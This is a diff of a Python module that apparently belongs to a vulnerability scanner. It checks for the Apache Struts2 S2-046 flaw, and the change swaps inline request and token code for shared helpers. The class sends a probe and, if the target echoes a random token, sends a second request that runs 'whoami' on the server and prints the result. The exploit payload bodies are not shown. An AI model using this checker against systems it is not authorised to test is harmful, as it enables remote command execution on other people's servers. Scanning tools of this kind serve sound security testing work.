@@ -7,19 +7,13 @@ description: Struts2 S2-046漏洞可执行任意命令
 
 import re
 import urllib
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class S2_046_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta=''
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words)
+        self.capta = get_capta()
         self.headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                    'Content-Type': 'multipart/form-data; boundary=---------------------------735323031399963166993862150'
@@ -33,9 +27,9 @@ class S2_046_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.post(self.url, headers = self.headers, data = self.check_data, allow_redirects = False, verify = False)
+            check_req = request.post(self.url, headers = self.headers, data = self.check_data)
             if self.capta in check_req.text:
-                cmd_req = requests.post(self.url, headers = self.headers, data = self.cmd_data, allow_redirects = False, verify = False)
+                cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_data)
                 print('存在S2-046漏洞,执行whoami命令成功，结果为：', cmd_req.text)
                 return True
             else:
